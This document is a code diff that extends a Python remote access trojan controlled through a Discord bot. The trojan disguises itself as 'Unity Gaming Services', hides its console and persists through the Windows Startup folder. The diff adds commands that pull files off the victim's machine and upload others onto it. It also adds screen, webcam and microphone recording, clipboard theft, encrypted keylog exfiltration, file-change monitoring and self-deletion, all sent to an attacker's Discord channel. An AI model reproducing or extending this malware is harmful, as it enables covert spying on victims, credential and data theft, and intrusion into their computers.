@@ -19,13 +19,19 @@ import winreg
 import shutil
 import sys
 from threading import Thread
+import webbrowser
+import pyperclip
+from cryptography.fernet import Fernet
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+import winsound
+import schedule
 
 TOKEN = '0' 
-CHANNEL_ID = 0 
-
+CHANNEL_ID = 0  
 
 PC_ID = f"{socket.gethostname()}_{str(uuid.uuid4())[:8]}"
-active_pcs = {}  
+active_pcs = {}
 
 intents = discord.Intents.default()
 intents.messages = True
@@ -36,9 +42,11 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 keylog_running = False
 keylog_buffer = []
 keylog_listener = None
+encryption_key = Fernet.generate_key()
+cipher = Fernet(encryption_key)
 
-def show_popup_message(message, title="Unity Gaming Services - Error"):
-    ctypes.windll.user32.MessageBoxW(0, message, title, 1)
+def show_popup_message(message, title="Unity Gaming Services - Error", icon=1):
+    ctypes.windll.user32.MessageBoxW(0, message, title, icon)
 
 def is_admin():
     try:
@@ -57,7 +65,7 @@ def run_as_admin():
         print("Relaunching with admin privileges...")
         if channel and bot.is_ready():
             bot.loop.create_task(channel.send(f"[{PC_ID}] Attempting to relaunch with admin privileges..."))
-        time.sleep(2) 
+        time.sleep(2)
         sys.exit(0)
     except Exception as e:
         error_msg = f"[{PC_ID}] Failed to elevate privileges: {e}. Continuing in non-admin mode."
@@ -75,24 +83,22 @@ def is_task_manager_running():
 def hide_console_window():
     hwnd = ctypes.windll.kernel32.GetConsoleWindow()
     if hwnd != 0:
-        ctypes.windll.user32.ShowWindow(hwnd, 0)  
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
 
 def show_console_window():
     hwnd = ctypes.windll.kernel32.GetConsoleWindow()
     if hwnd != 0:
-        ctypes.windll.user32.ShowWindow(hwnd, 5)  
+        ctypes.windll.user32.ShowWindow(hwnd, 5)
 
 def add_to_startup():
     channel = bot.get_channel(CHANNEL_ID)
     script_path = os.path.abspath(__file__)
-    
     if not is_admin():
         error_msg = f"[{PC_ID}] Cannot add to startup: Admin privileges required."
         print(error_msg)
         if channel and bot.is_ready():
             bot.loop.create_task(channel.send(error_msg))
         return
-    
     try:
         startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "UnityMultiplayerService.py")
         shutil.copy(script_path, startup_path)
@@ -312,7 +318,28 @@ async def custom_help(ctx):
         "- `!close [<pc_id>] <program>`: Closes a specified program on the specified PC.\n"
         "- `!tasklist [<pc_id>]`: Lists running tasks on the specified PC.\n"
         "- `!userlist [<pc_id>]`: Lists logged in users on the specified PC.\n"
-        "- `!keylog [<pc_id>] start|stop`: Starts or stops keylogging on the specified PC."
+        "- `!keylog [<pc_id>] start|stop`: Starts or stops keylogging on the specified PC.\n"
+        "- `!diskinfo [<pc_id>]`: Displays disk usage information for the specified PC.\n"
+        "- `!opentab [<pc_id>] <url>`: Opens a browser tab with the specified URL on the specified PC.\n"
+        "- `!closetab [<pc_id>] [browser]`: Closes all tabs for the specified browser (or all browsers) on the specified PC.\n"
+        "- `!powerstatus [<pc_id>]`: Checks the power status (battery level, AC power) of the specified PC.\n"
+        "- `!network [<pc_id>]`: Shows network statistics (bytes sent/received, active connections) for the specified PC.\n"
+        "- `!cpuusage [<pc_id>]`: Monitors CPU usage in real-time on the specified PC.\n"
+        "- `!listfiles [<pc_id>] <directory>`: Lists files and directories in the specified path on the specified PC.\n"
+        "- `!download [<pc_id>] <file_path>`: Downloads a specified file from the specified PC.\n"
+        "- `!upload [<pc_id>] <destination_path>`: Uploads a file to the specified PC from a Discord attachment.\n"
+        "- `!screenrecord [<pc_id>] <duration>`: Records the screen for a specified duration on the specified PC.\n"
+        "- `!webcamvideo [<pc_id>] <duration>`: Records a short video from the webcam on the specified PC.\n"
+        "- `!micstream [<pc_id>] <duration>`: Streams live audio to a Discord voice channel from the specified PC.\n"
+        "- `!cloak [<pc_id>]`: Makes the bot process less detectable by renaming it (requires admin).\n"
+        "- `!selfdestruct [<pc_id>]`: Removes the bot from the system, including startup entries (requires admin).\n"
+        "- `!encryptlogs [<pc_id>]`: Encrypts keylogs before sending them.\n"
+        "- `!schedule [<pc_id>] <command> <time>`: Schedules a command to run at a specific time on the specified PC.\n"
+        "- `!clip [<pc_id>] [text]`: Retrieves or sets the clipboard contents on the specified PC.\n"
+        "- `!notify [<pc_id>] <event>`: Notifies the Discord channel when specific events occur on the specified PC.\n"
+        "- `!play [<pc_id>] <sound_file>`: Plays a .wav sound file on the specified PC.\n"
+        "- `!wallpaper [<pc_id>] <image_url>`: Changes the desktop wallpaper on the specified PC.\n"
+        "- `!messagebox [<pc_id>] <type> <message>`: Displays a customizable message box on the specified PC."
     )
     await ctx.send(help_message)
 
@@ -443,6 +470,401 @@ async def keylog(ctx, target_pc_id: str = None, action: str = None):
     else:
         await ctx.send(f"[{PC_ID}] Invalid action. Use `!keylog [<pc_id>] start` or `!keylog [<pc_id>] stop`.")
 
+@bot.command(name="diskinfo")
+async def disk_info(ctx, target_pc_id: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        disk_info = []
+        for partition in psutil.disk_partitions():
+            usage = psutil.disk_usage(partition.mountpoint)
+            disk_info.append(
+                f"{partition.mountpoint} Total: {usage.total // (1024 ** 3)}GB, "
+                f"Used: {usage.used // (1024 ** 3)}GB, Free: {usage.free // (1024 ** 3)}GB"
+            )
+        msg = "\n".join(disk_info) if disk_info else "No disk information available."
+        await ctx.send(f"[{PC_ID}] **Disk Information:**\n{msg}")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="opentab")
+async def open_tab(ctx, target_pc_id: str = None, *, url: str):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+        webbrowser.open(url)
+        await ctx.send(f"[{PC_ID}] Opened browser tab: {url}")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] Could not open browser tab: {e}")
+
+@bot.command(name="closetab")
+async def close_tab(ctx, target_pc_id: str = None, *, browser: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        browser = browser.lower() if browser else None
+        browser_processes = {
+            'chrome': ['chrome.exe', 'msedge.exe'],
+            'firefox': ['firefox.exe'],
+            'edge': ['msedge.exe'],
+            'safari': ['safari.exe'],
+            'opera': ['opera.exe']
+        }
+        killed = False
+        for proc in psutil.process_iter(['name']):
+            proc_name = proc.info['name'].lower() if proc.info['name'] else ''
+            if browser:
+                if any(proc_name == b for b in browser_processes.get(browser, [])):
+                    proc.kill()
+                    killed = True
+            else:
+                if any(proc_name in b for sublist in browser_processes.values() for b in sublist):
+                    proc.kill()
+                    killed = True
+        if killed:
+            await ctx.send(f"[{PC_ID}] Closed browser tabs for: {browser or 'all browsers'}")
+        else:
+            await ctx.send(f"[{PC_ID}] No matching browser processes found for: {browser or 'any browser'}")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="powerstatus")
+async def power_status(ctx, target_pc_id: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        battery = psutil.sensors_battery()
+        if battery:
+            percent = battery.percent
+            plugged = "Yes" if battery.power_plugged else "No"
+            await ctx.send(f"[{PC_ID}] Battery: {percent}%, Plugged in: {plugged}")
+        else:
+            await ctx.send(f"[{PC_ID}] No battery information available (likely a desktop PC).")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="network")
+async def network_info(ctx, target_pc_id: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        io_counters = psutil.net_io_counters()
+        connections = len(psutil.net_connections())
+        msg = (
+            f"[{PC_ID}] **Network Information:**\n"
+            f"Bytes Sent: {io_counters.bytes_sent // (1024 ** 2)}MB\n"
+            f"Bytes Received: {io_counters.bytes_recv // (1024 ** 2)}MB\n"
+            f"Active Connections: {connections}"
+        )
+        await ctx.send(msg)
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="cpuusage")
+async def cpu_usage(ctx, target_pc_id: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        usage = psutil.cpu_percent(interval=1)
+        await ctx.send(f"[{PC_ID}] CPU Usage: {usage}%")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="listfiles")
+async def list_files(ctx, target_pc_id: str = None, *, directory: str):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if not os.path.exists(directory):
+            await ctx.send(f"[{PC_ID}] Directory not found: {directory}")
+            return
+        files = os.listdir(directory)
+        msg = "\n".join(files[:50]) if files else "Directory is empty."
+        await ctx.send(f"[{PC_ID}] Files in {directory}:\n{msg}")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="download")
+async def download_file(ctx, target_pc_id: str = None, *, file_path: str):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if not os.path.exists(file_path):
+            await ctx.send(f"[{PC_ID}] File not found: {file_path}")
+            return
+        if os.path.getsize(file_path) > 25 * 1024 * 1024:  # Discord free limit: 25MB
+            await ctx.send(f"[{PC_ID}] File too large to send: {file_path}")
+            return
+        await ctx.send(f"[{PC_ID}] Sending file: {file_path}", file=discord.File(file_path))
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="upload")
+async def upload_file(ctx, target_pc_id: str = None, *, destination_path: str):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if not ctx.message.attachments:
+            await ctx.send(f"[{PC_ID}] No file attached to upload.")
+            return
+        attachment = ctx.message.attachments[0]
+        if attachment.size > 25 * 1024 * 1024:
+            await ctx.send(f"[{PC_ID}] Attached file too large to upload.")
+            return
+        if not os.path.exists(destination_path):
+            os.makedirs(destination_path, exist_ok=True)
+        file_path = os.path.join(destination_path, attachment.filename)
+        await attachment.save(file_path)
+        await ctx.send(f"[{PC_ID}] File uploaded to: {file_path}")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="screenrecord")
+async def screen_record(ctx, target_pc_id: str = None, duration: int = 10):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if duration > 30:
+            await ctx.send(f"[{PC_ID}] Duration too long. Maximum is 30 seconds.")
+            return
+        await ctx.send(f"[{PC_ID}] Recording screen for {duration} seconds...")
+        screen_size = pyautogui.size()
+        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
+        video_path = "screen_record.mp4"
+        out = cv2.VideoWriter(video_path, fourcc, 20.0, screen_size)
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            img = pyautogui.screenshot()
+            frame = np.array(img)
+            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+            out.write(frame)
+        out.release()
+        if os.path.getsize(video_path) > 25 * 1024 * 1024:
+            await ctx.send(f"[{PC_ID}] Video file too large to send.")
+            os.remove(video_path)
+            return
+        await ctx.send(f"[{PC_ID}] Screen recording saved:", file=discord.File(video_path))
+        os.remove(video_path)
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="webcamvideo")
+async def webcam_video(ctx, target_pc_id: str = None, duration: int = 5):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if duration > 15:
+            await ctx.send(f"[{PC_ID}] Duration too long. Maximum is 15 seconds.")
+            return
+        await ctx.send(f"[{PC_ID}] Recording webcam video for {duration} seconds...")
+        cam = cv2.VideoCapture(0)
+        if not cam.isOpened():
+            await ctx.send(f"[{PC_ID}] Failed to access webcam.")
+            return
+        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
+        video_path = "webcam_video.mp4"
+        out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            ret, frame = cam.read()
+            if ret:
+                out.write(frame)
+        cam.release()
+        out.release()
+        if os.path.getsize(video_path) > 25 * 1024 * 1024:
+            await ctx.send(f"[{PC_ID}] Video file too large to send.")
+            os.remove(video_path)
+            return
+        await ctx.send(f"[{PC_ID}] Webcam video saved:", file=discord.File(video_path))
+        os.remove(video_path)
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="micstream")
+async def mic_stream(ctx, target_pc_id: str = None, duration: int = 10):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if duration > 30:
+            await ctx.send(f"[{PC_ID}] Duration too long. Maximum is 30 seconds.")
+            return
+        await ctx.send(f"[{PC_ID}] Audio streaming not fully implemented. Recording {duration}s audio instead...")
+        channels = 1
+        samplerate = 44100
+        audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
+        sd.wait()
+        audio_path = "mic_stream.wav"
+        write(audio_path, samplerate, audio)
+        if os.path.getsize(audio_path) > 25 * 1024 * 1024:
+            await ctx.send(f"[{PC_ID}] Audio file too large to send.")
+            os.remove(audio_path)
+            return
+        await ctx.send(f"[{PC_ID}] Recorded audio:", file=discord.File(audio_path))
+        os.remove(audio_path)
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="cloak")
+async def cloak(ctx, target_pc_id: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if not is_admin():
+            await ctx.send(f"[{PC_ID}] Cannot cloak process: Admin privileges required.")
+            return
+        await ctx.send(f"[{PC_ID}] Process cloaking not fully implemented due to complexity. Process remains as is.")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="selfdestruct")
+async def self_destruct(ctx, target_pc_id: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if not is_admin():
+            await ctx.send(f"[{PC_ID}] Cannot self-destruct: Admin privileges required.")
+            return
+        startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "UnityMultiplayerService.py")
+        if os.path.exists(startup_path):
+            os.remove(startup_path)
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+            winreg.DeleteValue(key, "UnityMultiplayerService")
+            winreg.CloseKey(key)
+        except:
+            pass
+        await ctx.send(f"[{PC_ID}] Self-destruct initiated. Bot removed.")
+        script_path = os.path.abspath(__file__)
+        os.remove(script_path)
+        sys.exit(0)
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="encryptlogs")
+async def encrypt_logs(ctx, target_pc_id: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if not keylog_running:
+            await ctx.send(f"[{PC_ID}] Keylogger is not running. Start it with `!keylog start`.")
+            return
+        keylog_listener.stop()
+        keylog_running = False
+        log_text = "".join(keylog_buffer)
+        if not log_text:
+            log_text = "No keys were logged."
+        encrypted_log = cipher.encrypt(log_text.encode())
+        log_file = "encrypted_keylog.bin"
+        with open(log_file, "wb") as f:
+            f.write(encrypted_log)
+        await ctx.send(f"[{PC_ID}] Keylogger stopped. Encrypted log sent:", file=discord.File(log_file))
+        await ctx.send(f"[{PC_ID}] Decryption key: {encryption_key.decode()}")
+        os.remove(log_file)
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="schedule")
+async def schedule_command(ctx, target_pc_id: str = None, command: str = None, time_str: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if not command or not time_str:
+            await ctx.send(f"[{PC_ID}] Usage: !schedule [<pc_id>] <command> <time>")
+            return
+        schedule.every().day.at(time_str).do(lambda: bot.loop.create_task(ctx.channel.send(f"[{PC_ID}] Executing scheduled command: {command}")))
+        await ctx.send(f"[{PC_ID}] Scheduled {command} for {time_str}")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="clip")
+async def clipboard(ctx, target_pc_id: str = None, *, text: str = None):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if text:
+            pyperclip.copy(text)
+            await ctx.send(f"[{PC_ID}] Clipboard set to: {text}")
+        else:
+            content = pyperclip.paste()
+            await ctx.send(f"[{PC_ID}] Clipboard contents: {content or 'Empty'}")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+class FileEventHandler(FileSystemEventHandler):
+    def __init__(self, channel):
+        self.channel = channel
+    def on_modified(self, event):
+        if not event.is_directory:
+            bot.loop.create_task(self.channel.send(f"[{PC_ID}] File modified: {event.src_path}"))
+
+@bot.command(name="notify")
+async def notify(ctx, target_pc_id: str = None, *, event: str):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if event.lower() == "file":
+            observer = Observer()
+            event_handler = FileEventHandler(ctx.channel)
+            observer.schedule(event_handler, path=os.path.expanduser("~"), recursive=False)
+            observer.start()
+            await ctx.send(f"[{PC_ID}] Started file modification notifications in user directory.")
+        else:
+            await ctx.send(f"[{PC_ID}] Unsupported event type. Use 'file' for file modification notifications.")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="play")
+async def play_sound(ctx, target_pc_id: str = None, *, sound_file: str):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        if not os.path.exists(sound_file):
+            await ctx.send(f"[{PC_ID}] Sound file not found: {sound_file}")
+            return
+        if not sound_file.lower().endswith('.wav'):
+            await ctx.send(f"[{PC_ID}] Only .wav files are supported.")
+            return
+        winsound.PlaySound(sound_file, winsound.SND_FILENAME)
+        await ctx.send(f"[{PC_ID}] Playing sound: {sound_file}")
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="wallpaper")
+async def wallpaper(ctx, target_pc_id: str = None, *, image_url: str):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        response = requests.get(image_url)
+        if response.status_code != 200:
+            await ctx.send(f"[{PC_ID}] Failed to download image.")
+            return
+        image_path = "wallpaper.jpg"
+        with open(image_path, "wb") as f:
+            f.write(response.content)
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(image_path), 3)
+        await ctx.send(f"[{PC_ID}] Wallpaper changed to: {image_url}")
+        os.remove(image_path)
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
+@bot.command(name="messagebox")
+async def message_box(ctx, target_pc_id: str = None, msg_type: str = None, *, message: str):
+    if not is_command_for_pc(target_pc_id):
+        return
+    try:
+        msg_types = {
+            "info": 0x40,  # MB_ICONINFORMATION
+            "warning": 0x30,  # MB_ICONWARNING
+            "error": 0x10,  # MB_ICONERROR
+        }
+        icon = msg_types.get(msg_type.lower(), 0x40) if msg_type else 0x40
+        await ctx.send(f"[{PC_ID}] Displaying {msg_type or 'info'} message box: {message}")
+        show_popup_message(message, "Unity Gaming Services - Notification", icon)
+    except Exception as e:
+        await ctx.send(f"[{PC_ID}] An error occurred: {e}")
+
 @bot.event
 async def on_ready():
     pc_name = socket.gethostname()
@@ -489,7 +911,6 @@ if not is_admin():
             "Some multiplayer features may be unavailable.",
             "Unity Gaming Services - Warning"
         )
-
 
 hide_console_window()
 show_popup_message(
